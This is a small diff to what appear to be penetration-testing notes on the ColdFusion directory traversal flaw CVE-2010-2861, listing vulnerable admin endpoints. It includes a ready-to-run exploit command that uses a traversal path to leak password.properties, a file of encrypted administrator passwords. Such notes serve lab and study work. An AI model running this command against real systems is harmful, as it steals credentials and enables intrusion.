@@ -13,7 +13,6 @@
 ### Directory Traversal (CVE-2010-2861)
 
 - Vulnerable Endpoints
-
     - `/CFIDE/administrator/settings/mappings.cfm`
     -   `/CFIDE/administrator/enter.cfm`
 - Exploit `python2 14641.py <TARGET_IP> 8500 "../../../../../../../../ColdFusion8/lib/password.properties"`Leak password.properties (contains encrypted admin passwords).
